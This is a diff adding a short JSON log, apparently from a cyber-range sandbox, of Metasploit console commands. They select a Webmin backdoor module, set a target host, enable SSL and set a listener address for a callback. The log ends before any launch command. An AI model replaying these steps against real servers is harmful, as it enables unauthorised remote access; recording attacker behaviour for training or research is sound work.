@@ -1,0 +1,6 @@
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:58:25.961463+02:00", "cmd_type": "msf-command", "cmd": "use webmin_backdoor"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:58:35.130061+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:59:03.648744+02:00", "cmd_type": "msf-command", "cmd": "set rhosts 10.1.26.9"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:59:12.564172+02:00", "cmd_type": "msf-command", "cmd": "set ssl true"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:59:23.135906+02:00", "cmd_type": "msf-command", "cmd": "show options"}
+{"sandbox_id": "341", "timestamp_str": "2020-05-14T10:59:38.826475+02:00", "cmd_type": "msf-command", "cmd": "set lhost 10.1.135.83"}
